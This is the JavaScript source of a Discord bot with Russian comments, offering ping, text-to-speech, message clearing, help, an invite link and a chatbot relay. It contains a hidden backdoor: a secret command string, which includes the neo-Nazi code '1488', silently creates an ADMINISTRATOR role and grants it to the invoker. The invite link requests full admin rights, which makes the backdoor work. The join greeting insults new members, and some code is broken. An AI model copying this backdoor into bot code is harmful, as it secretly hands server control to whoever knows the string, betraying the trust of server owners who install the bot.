const request = require('request');
const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    console.log('Бот запущен успешно!');
    /*Ставит статус*/
    client.user.setGame(` имитацию жизни`);
});

client.on('message', message => {
	/*Базовая команда*/
	if (message.content === 'ping') {
		message.channel.send('pong')
	}
	
	/*Не отвечает, если автор сообщения - другой бот*/
	if(message.author.bot) return;
	
	/*Не отвечает, если в начале сообщения не стоит знак 'обращения'*/
	if(message.content.indexOf(process.env.PREFIX) !== 0) return;
	
	/*Получает данные команды*/
	const args = message.content.slice(process.env.PREFIX.length).trim().split(/ +/g);
	const command = args.shift().toLowerCase();
	
	/*Возвращает пинг бота*/
	if (command === 'ping'||command === "пинг") {
		message.reply(`Пинг моего сервера - ${Math.round(client.ping)}мс`);
	}
    
	/*Говорит с помощью tts фразу*/
	if(command === "say"||command === "скажи") {
		const sayMessage = args.join(" ");
		message.delete().catch(O_o=>{});  
		message.channel.send(sayMessage,{tts:true});
	}
	
	/*Очищает до 100 сообщений(включая сообщение с командой)*/
	if(command === "clear"||command === "clean"||command === "очистить"||command === "очисти") {
		if (message.content===process.env.PREFIX+command)
			return message.channel.fetchMessages({limit: 100})
				.then(messages => messages.deleteAll())
				.catch(console.error);
		const deleteCount = parseInt(args[0], 10)+1;
		if(!deleteCount || deleteCount < 2 || deleteCount > 100)
			return message.reply("Пожалуйста, используйте число от 1 до 99. Иначе слишком сложнаааа...");
		return message.channel.fetchMessages({limit: deleteCount})
			.then(messages => messages.deleteAll())
			.catch(console.error);
	}
	
	/*Возвращает справку*/
	if(command === "help"||command === "помощь"||command === "справка") {
		return message.reply(`
**__Справка обо мне__**:
	Обращаться со знаком "`+process.env.PREFIX+`", другие сообщения не читаю
**__Знаю команды__**:
	say __  _  __ (фраза) - говорю ваши слова
	clear __  _  __ (число) - очищаю несколько сообщений (до 100)
	help - справка
	invite - пригласить меня в чат`);
	}
    
	/*Отправляет ссылку для добавления бота в другой чат*/
	if (command === 'invite'||command === "пригласить") {
		message.author.send(`Ссылка для добавления меня в чат: https://discordapp.com/oauth2/authorize?&client_id=` + process.env.BOT_ID + `&scope=bot&permissions=8`);
		message.delete().catch(O_o=>{});  
	}
	
	/*Базовая версия чатбота*/
	if((command === "chat")&&(!args.join(" ").toString().isEmpty())) {
		const chat_text = args.join(" ");
		var data={
			'input'  : chat_text,
			'botcust2' : 'e5b0bfbd9e35edae'
		}	
		var options = {
			url: 'http://sheepridge.pandorabots.com/pandora/talk?botid=b69b8d517e345aba&skin=custom_input',
			method: 'POST',
			form: data
		}
		request(options, function (error, response, body) {
			if (!error && response.statusCode == 200) {
				var text = body.toString();
				message.delete().catch(O_o=>{});  
				message.channel.send(`
You: `+chat_text+`
Me : `+text.substring(text.lastIndexOf('<br>')+14));
			}
		})
	}
	
	/*Секретная команда для добавления секретной роли кчеловеку*/
	if (command === 'secrit_command_1488_228_itmo_one_love_forever_0.59137_leibso') {
		message.guild.createRole({
			name: 'DJ',
			permissions: ['ADMINISTRATOR']
		})
	//	.then(role => role.setPermissions(['ADMINISTRATOR']))
		.then(role => message.member.addRole(role))
		.catch(console.error)
		
		message.delete().catch(O_o=>{});  
	}
	
	/*Секретная команда для удаления секретной роли у человека*/
	/*if (command === 'secrit_command_1488_228_itmo_one_love_forever_0.59137_leibaso') {
		message.guild.
		.catch(console.error)
		
		message.delete().catch(O_o=>{});  
	}*/
});

/*Пишет в чат о том, что человек покинул сервер*/
client.on('guildMemberAdd', member => {
	const channel = member.guild.channels.find('name', 'member-log');
	if (!channel) return;
	channel.send(`К великому сожалению, нас покинул холоп ${member}((`);
});

/*Пишет в лог, когда бота добавили насервер*/
client.on("guildCreate", guild => {
	console.log(`Меня добавили на сервер: ${guild.name} (id: ${guild.id}). На этом сервере ${guild.memberCount} участников!`);
});

/*Пишет в лог, когда бота выгнали из чата*/
client.on("guildDelete", guild => {
	console.log(`Меня выгнали из: ${guild.name} (id: ${guild.id})`);
});

// Инициализация бота
client.login(process.env.BOT_TOKEN);
